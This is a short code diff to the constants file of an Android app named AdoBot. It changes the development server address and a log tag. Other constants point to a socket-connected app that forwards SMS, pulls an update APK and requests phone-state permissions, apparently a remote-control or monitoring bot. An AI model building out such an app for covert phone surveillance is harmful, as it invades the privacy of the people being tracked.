@@ -6,13 +6,13 @@ import io.socket.client.Socket
 object Constants {
 
     var socket: Socket? = null
-    val DEVELOPMENT_SERVER = "http://kiran.fr.openode.io/"
+    val DEVELOPMENT_SERVER = "http://192.168.25.102:3000"
 
     val PACKAGE_NAME = "me.adobot"
     val UPDATE_PKG_FILE_NAME = "update.apk"
     val SMS_FORWARDER_SIGNATURE = "AdoBot SMS Forwarder"
     val PREF_SERVER_URL_FIELD = "serverUrl"
-    const val tag = "suthar"
+    const val tag = "jramirez"
 
 
     val PERMISSIONS = arrayOf(Manifest.permission.READ_PHONE_STATE,
